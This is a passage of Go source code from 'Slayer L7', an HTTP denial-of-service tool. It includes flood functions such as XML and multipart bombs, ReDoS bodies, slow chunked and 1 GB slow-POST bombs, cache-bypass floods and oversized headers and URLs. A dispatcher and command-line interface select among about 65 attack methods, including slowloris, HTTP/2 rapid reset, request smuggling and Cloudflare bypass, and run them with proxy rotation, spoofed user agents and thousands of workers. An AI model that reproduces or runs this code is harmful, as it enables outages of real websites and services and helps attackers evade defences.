    sb.WriteString(`<?xml version="1.0"?><root>`)
    for i := 0; i < depth; i++ {
        fmt.Fprintf(&sb, `<node id="%s" data="`, randString(32))
        sb.WriteString(randString(500))
        sb.WriteString(`">`)
    }
    sb.WriteString(`<payload>`)
    sb.WriteString(randString(5000))
    sb.WriteString(`</payload>`)
    for i := 0; i < depth; i++ {
        sb.WriteString(`</node>`)
    }
    sb.WriteString(`</root>`)

    body := sb.String()
    contentType := "application/xml"

    if mrand.IntN(2) == 0 {
        contentType = "text/xml; charset=utf-8"
    }

    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", contentType)
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/xml, application/xml, */*")
    req.Header.Set("SOAPAction", "http://tempuri.org/"+randString(10))

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpMixBunchOf(targetURL string, client *http.Client) error {
    var buf bytes.Buffer
    boundary := "----WebKitFormBoundary" + randString(16)

    numParts := 200 + mrand.IntN(300)

    for i := 0; i < numParts; i++ {
        fmt.Fprintf(&buf, "--%s\r\n", boundary)
        if mrand.IntN(2) == 0 {
            fmt.Fprintf(&buf, "Content-Disposition: form-data; name=\"%s\"\r\n\r\n", randString(20))
            buf.WriteString(randString(500))
            buf.WriteString("\r\n")
        } else {
            fmt.Fprintf(&buf, "Content-Disposition: form-data; name=\"%s\"; filename=\"%s.bin\"\r\n", randString(10), randString(10))
            buf.WriteString("Content-Type: application/octet-stream\r\n\r\n")
            binaryData := make([]byte, 1024+mrand.IntN(4096))
            rand.Read(binaryData)
            buf.Write(binaryData)
            buf.WriteString("\r\n")
        }
    }
    fmt.Fprintf(&buf, "--%s--\r\n", boundary)

    body := buf.Bytes()
    req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpMixRegex(targetURL string, client *http.Client) error {
    redosCore := strings.Repeat("a", 50) + "!"

    var body string
    var contentType string

    switch mrand.IntN(3) {
    case 0:
        body = fmt.Sprintf(`{"email":"%s@example.com","user":"%s","pass":"%s"}`, redosCore, redosCore, redosCore)
        contentType = "application/json"
    case 1:
        body = fmt.Sprintf(`<root><email>%s</email><user>%s</user></root>`, redosCore, redosCore)
        contentType = "application/xml"
    case 2:
        body = "email=" + url.QueryEscape(redosCore) + "&user=" + url.QueryEscape(redosCore)
        contentType = "application/x-www-form-urlencoded"
    }

    req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", contentType)
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

type chunkedSlowReader struct {
    data []byte
    pos  int
    stop <-chan struct{}
}

func (r *chunkedSlowReader) Read(p []byte) (int, error) {
    select {
    case <-r.stop:
        return 0, io.EOF
    default:
    }

    if r.pos >= len(r.data) {
        return 0, io.EOF
    }

    time.Sleep(time.Duration(1000+mrand.IntN(2000)) * time.Millisecond)

    n := copy(p, r.data[r.pos:r.pos+1+mrand.IntN(1)])
    r.pos += n
    return n, nil
}

func httpMixChunkedSlow(targetURL string, client *http.Client, stop <-chan struct{}) error {
    var body string
    switch mrand.IntN(3) {
    case 0:
        body = fmt.Sprintf(`{"data":"%s","token":"%s"}`, randString(5000), randString(64))
    case 1:
        body = "data=" + randString(5000) + "&token=" + randString(64)
    case 2:
        body = fmt.Sprintf(`<root><data>%s</data></root>`, randString(5000))
    }

    slow := &chunkedSlowReader{
        data: []byte(body),
        stop: stop,
    }

    req, err := http.NewRequest("POST", targetURL, slow)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    req.ContentLength = -1
    req.Header.Set("Transfer-Encoding", "chunked")
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    slowClient := &http.Client{
        Transport: client.Transport,
        Timeout:   0,
    }

    resp, err := slowClient.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpCacheBypass(targetURL string, client *http.Client) error {
    sep := "?"
    if strings.Contains(targetURL, "?") {
        sep = "&"
    }
    fullURL := targetURL + sep + "v=" + strconv.FormatInt(time.Now().UnixNano(), 10) + "&r=" + randString(32)

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
    req.Header.Set("Accept-Language", "en-US,en;q=0.5")
    req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
    req.Header.Set("Pragma", "no-cache")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()

    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

type slowPayloadReader struct {
    size int64
    sent int64
    stop <-chan struct{}
}

func (r *slowPayloadReader) Read(p []byte) (int, error) {
    select {
    case <-r.stop:
        return 0, io.EOF
    default:
    }

    if r.sent >= r.size {
        return 0, io.EOF
    }

    time.Sleep(500 * time.Millisecond)
    p[0] = 'A'
    r.sent++
    return 1, nil
}

func httpSlowPostBomb(targetURL string, client *http.Client, stop <-chan struct{}) error {
    payload := &slowPayloadReader{
        size: 1 * 1024 * 1024 * 1024,
        stop: stop,
    }

    req, err := http.NewRequest("POST", targetURL, payload)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    req.ContentLength = payload.size
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Connection", "keep-alive")

    slowClient := &http.Client{
        Transport: client.Transport,
        Timeout:   0,
    }

    resp, err := slowClient.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }

    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()

    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpMultipartBomb(targetURL string, client *http.Client) error {
    var buf bytes.Buffer
    boundary := "----WebKitFormBoundary" + randString(16)
    fmt.Fprintf(&buf, "--%s\r\n", boundary)
    fmt.Fprintf(&buf, "Content-Disposition: form-data; name=\"%s\"; filename=\"%s.bin\"\r\n", randString(10), randString(10))
    fmt.Fprintf(&buf, "Content-Type: application/octet-stream\r\n\r\n")
    
    largeData := make([]byte, 10*1024*1024)
    rand.Read(largeData)
    buf.Write(largeData)
    
    fmt.Fprintf(&buf, "\r\n--%s--\r\n", boundary)

    body := buf.Bytes()
    req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("Content-Type", "multipart/form-data; boundary="+boundary)
    req.Header.Set("Content-Length", strconv.Itoa(len(body)))
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpLongURL(targetURL string, client *http.Client) error {
    sep := "?"
    if strings.Contains(targetURL, "?") {
        sep = "&"
    }
    fullURL := targetURL + sep + randString(16384)

    req, err := http.NewRequest("GET", fullURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func httpHeaderTab(targetURL string, client *http.Client) error {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    req.Header.Set("User-Agent", randUA())
    req.Header.Set("Accept", "*/*")
    
    for i := 0; i < 50; i++ {
        req.Header.Add("X-"+randString(8), "\t"+randString(1024)+"\t")
    }

    resp, err := client.Do(req)
    if err != nil {
        recordStatus("Err")
        totalErrors.Add(1)
        return err
    }
    io.Copy(io.Discard, resp.Body)
    resp.Body.Close()
    recordStatus(strconv.Itoa(resp.StatusCode))
    totalSuccess.Add(1)
    return nil
}

func Worker(id int, targetURL string, method string, clients []*http.Client, stop <-chan struct{}, verbose bool, rateMS int) {
    client := clients[id%len(clients)]
    for {
        select {
        case <-stop:
            return
        default:
        }

        var err error
        switch strings.ToLower(method) {
        case "httpget":
            err = httpGet(targetURL, client)
        case "httppost":
            err = httpPost(targetURL, client)
        case "rudy":
            err = httpRudy(targetURL, client, stop)
        case "apiflood":
            err = httpAPIFlood(targetURL, client)
        case "rapidreset_adv":
            err = httpRapidResetAdvanced(targetURL, stop)
        case "wsflood":
            err = wsFlood(targetURL, stop)
        case "slowloris":
            err = httpSlowloris(targetURL, stop)
        case "headerflood":
            err = httpHeaderFlood(targetURL, client)
        case "mixpost":
            err = httpMixPost(targetURL, client)
        case "cfbypass":
            err = httpCFBypass(targetURL, client)
        case "range":
            err = httpRangeAttack(targetURL, client)
        case "cookiebomb":
            err = httpCookieBomb(targetURL, client)
        case "chunkpost":
            err = httpChunkPost(targetURL, client, stop)
        case "malformed":
            err = httpMalformed(targetURL, stop)
        case "h2continuation":
            err = httpH2Continuation(targetURL, stop)
        case "graphql_batch":
            err = httpGraphQLBatch(targetURL, client)
        case "zstd_bomb":
            err = httpZstdBomb(targetURL, client)
        case "redos":
            err = httpReDoS(targetURL, client)
        case "cache_poison":
            err = httpCachePoison(targetURL, client)
        case "smuggle_clte":
            err = httpSmuggleCLTE(targetURL, stop)
        case "pingback":
            err = httpPingback(targetURL, client)
        case "httpoptions":
            err = httpOptionsFlood(targetURL, client)
        case "httpdelete":
            err = httpDeleteFlood(targetURL, client)
        case "httpput":
            err = httpPutFlood(targetURL, client)
        case "httphead":
            err = httpHeadFlood(targetURL, client)
        case "xss_probe":
            err = httpXSSProbe(targetURL, client)
        case "sqli_probe":
            err = httpSQLiProbe(targetURL, client)
        case "path_traversal":
            err = httpPathTraversal(targetURL, client)
        case "smuggle_tete":
            err = httpSmuggleTete(targetURL, stop)
        case "http_empty":
            err = httpEmptyFlood(targetURL, client)
        case "http_invalid_req":
            err = httpInvalidReqLine(targetURL, stop)
        case "http_ghost":
            err = httpGhostFlood(targetURL, stop)
        case "http_frag":
            err = httpFragFlood(targetURL, stop)
        case "http_header_split":
            err = httpHeaderSplit(targetURL, client)
        case "http_ssrf":
            err = httpSSRFFlood(targetURL, client)
        case "http_slow_read":
            err = httpSlowRead(targetURL, client, stop)
        case "http_invalid_hdr":
            err = httpInvalidHeader(targetURL, stop)
        case "http_rapid_connect":
            err = httpRapidConnect(targetURL, stop)
        case "http_auth":
            err = httpAuthFlood(targetURL, client)
        case "http_h2_flood":
            err = httpH2Flood(targetURL, stop)
        case "http_json":
            err = httpJsonFlood(targetURL, client)
        case "http_multipart":
            err = httpMultipartFlood(targetURL, client)
        case "http_conn_smuggle":
            err = httpConnectionSmuggle(targetURL, stop)
        case "http_long_hdr":
            err = httpLongHeader(targetURL, stop)
        case "http_cache_maxage":
            err = httpCacheMaxAge(targetURL, client)
        case "http_dead_conn":
            err = httpDeadConn(targetURL, client, stop)
        case "http_bad_start":
            err = httpBadStart(targetURL, stop)
        case "http_form_bomb":
            err = httpFormBomb(targetURL, client)
        case "http_ntlm":
            err = httpNTLMFlood(targetURL, client)
        case "http_event_stream":
            err = httpEventStream(targetURL, client, stop)
        case "http_poll":
            err = httpPollFlood(targetURL, client)
        case "http_payload":
            err = httpPayloadFlood(targetURL, client)
        case "h2_window":
            err = httpH2WindowExhaust(targetURL, stop)
        case "graphql_recursion":
            err = httpGraphQLDeepRecursion(targetURL, client)
        case "h2_cont_bomb":
            err = httpH2ContinuationBomb(targetURL, stop)
        case "mixheavy":
            err = httpMixHeavy(targetURL, client)
        case "mixbunchof":
            err = httpMixBunchOf(targetURL, client)
        case "mixregex":
            err = httpMixRegex(targetURL, client)
        case "mixchunked":
            err = httpMixChunkedSlow(targetURL, client, stop)
        case "cachebypass":
            err = httpCacheBypass(targetURL, client)
        case "slowpost_bomb":
            err = httpSlowPostBomb(targetURL, client, stop)
        case "http_multipart_bomb":
            err = httpMultipartBomb(targetURL, client)
        case "http_long_url":
            err = httpLongURL(targetURL, client)
        case "http_header_tab":
            err = httpHeaderTab(targetURL, client)
        default:
            fmt.Fprintf(os.Stderr, "\n  unknown method: %s\n", method)
            os.Exit(1)
        }

        if err == nil {
            totalSent.Add(1)
        }

        if rateMS > 0 {
            time.Sleep(time.Duration(rateMS) * time.Millisecond)
        }
    }
}

func main() {
    target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
    method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset_adv, wsflood, slowloris, headerflood, mixpost, cfbypass, range, cookiebomb, chunkpost, malformed, h2continuation, graphql_batch, zstd_bomb, redos, cache_poison, smuggle_clte, pingback, httpoptions, httpdelete, httpput, httphead, xss_probe, sqli_probe, path_traversal, smuggle_tete, http_empty, http_invalid_req, http_ghost, http_frag, http_header_split, http_ssrf, http_slow_read, http_invalid_hdr, http_rapid_connect, http_auth, http_h2_flood, http_json, http_multipart, http_conn_smuggle, http_long_hdr, http_cache_maxage, http_dead_conn, http_bad_start, http_form_bomb, http_ntlm, http_event_stream, http_poll, http_payload, h2_window, graphql_recursion, h2_cont_bomb, mixheavy, mixbunchof, mixregex, mixchunked, cachebypass, slowpost_bomb, http_multipart_bomb, http_long_url, http_header_tab")
    workerCount := flag.Int("w", 2048, "number of workers")
    dur := flag.Int("d", 30, "duration in seconds")
    pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
    verbose := flag.Bool("v", false, "print request errors to stderr")
    rateDelay := flag.Int("r", 0, "delay in ms between requests per worker (0 = unlimited)")
    flag.Parse()

    if *target == "" {
        fmt.Println("Slayer L7")
        fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
        fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset_adv | wsflood | slowloris | headerflood | mixpost | cfbypass | range | cookiebomb | chunkpost | malformed | h2continuation | graphql_batch | zstd_bomb | redos | cache_poison | smuggle_clte | pingback | httpoptions | httpdelete | httpput | httphead | xss_probe | sqli_probe | path_traversal | smuggle_tete | http_empty | http_invalid_req | http_ghost | http_frag | http_header_split | http_ssrf | http_slow_read | http_invalid_hdr | http_rapid_connect | http_auth | http_h2_flood | http_json | http_multipart | http_conn_smuggle | http_long_hdr | http_cache_maxage | http_dead_conn | http_bad_start | http_form_bomb | http_ntlm | http_event_stream | http_poll | http_payload | h2_window | graphql_recursion | h2_cont_bomb | mixheavy | mixbunchof | mixregex | mixchunked | cachebypass | slowpost_bomb | http_multipart_bomb | http_long_url | http_header_tab")
        fmt.Println()
        flag.PrintDefaults()
        os.Exit(1)
    }

    targetURL := *target
    workers := *workerCount
    duration := *dur
    proxyFile := *pFile

    validMethods := map[string]bool{
        "httpget": true, "httppost": true, "rudy": true, "apiflood": true, "rapidreset_adv": true, "wsflood": true,
        "slowloris": true, "headerflood": true, "mixpost": true, "cfbypass": true, "range": true, "cookiebomb": true,
        "chunkpost": true, "malformed": true, "h2continuation": true, "graphql_batch": true, "zstd_bomb": true,
        "redos": true, "cache_poison": true, "smuggle_clte": true, "pingback": true, "httpoptions": true, "httpdelete": true,
        "httpput": true, "httphead": true, "xss_probe": true, "sqli_probe": true, "path_traversal": true, "smuggle_tete": true,
        "http_empty": true, "http_invalid_req": true, "http_ghost": true, "http_frag": true, "http_header_split": true,
        "http_ssrf": true, "http_slow_read": true, "http_invalid_hdr": true, "http_rapid_connect": true, "http_auth": true,
        "http_h2_flood": true, "http_json": true, "http_multipart": true, "http_conn_smuggle": true, "http_long_hdr": true,
        "http_cache_maxage": true, "http_dead_conn": true, "http_bad_start": true, "http_form_bomb": true, "http_ntlm": true,
        "http_event_stream": true, "http_poll": true, "http_payload": true, "h2_window": true, "graphql_recursion": true,
        "h2_cont_bomb": true, "mixheavy": true, "mixbunchof": true, "mixregex": true, "mixchunked": true,
        "cachebypass": true, "slowpost_bomb": true, "http_multipart_bomb": true, "http_long_url": true, "http_header_tab": true,
    }
    if !validMethods[strings.ToLower(*method)] {
        fmt.Fprintf(os.Stderr, "\n  \033[31m✗\033[0m Unknown method: %s\n", *method)
        os.Exit(1)
    }

    needsClientPool := true
    switch strings.ToLower(*method) {
    case "rapidreset_adv", "wsflood", "slowloris", "malformed", "h2continuation", "smuggle_clte", "smuggle_tete", "http_invalid_req", "http_ghost", "http_frag", "http_invalid_hdr", "http_rapid_connect", "http_h2_flood", "http_conn_smuggle", "http_long_hdr", "http_bad_start", "h2_window", "h2_cont_bomb", "mixchunked", "slowpost_bomb":
        needsClientPool = false
    }

    var clients []*http.Client

    if proxyFile != "" {
        proxies, err := loadProxies(proxyFile)
        if err != nil {
            log.Fatalf("failed to load proxies: %v", err)
        }
        proxyList = proxies
        if needsClientPool {
            clients, err = buildClientPool(proxies, workers)
            if err != nil {
                log.Fatalf("failed to build client pool: %v", err)
            }
        }
    } else {
        if needsClientPool {
            poolSize := workers / 8
            if poolSize < 4 {
                poolSize = 4
            }
            if poolSize > maxDirectPool {
                poolSize = maxDirectPool
            }
            clients = buildDirectPool(poolSize)
        }
    }

    if clients == nil {
        clients = []*http.Client{{}}
    }

    stop := make(chan struct{})
    for i := 0; i < workers; i++ {
        go Worker(i, targetURL, *method, clients, stop, *verbose, *rateDelay)
    }

    ticker := time.NewTicker(100 * time.Millisecond)
    defer ticker.Stop()

    for {
        select {
        case <-time.After(time.Duration(duration) * time.Second):
            close(stop)
            drawUI(targetURL, *method, proxyFile, workers, duration)
            fmt.Printf("\n  %s\033[1m\033[31mATTACK COMPLETE\033[0m\n", cBlink)
            os.Exit(0)
        case <-ticker.C:
            drawUI(targetURL, *method, proxyFile, workers, duration)
        }
    }
}
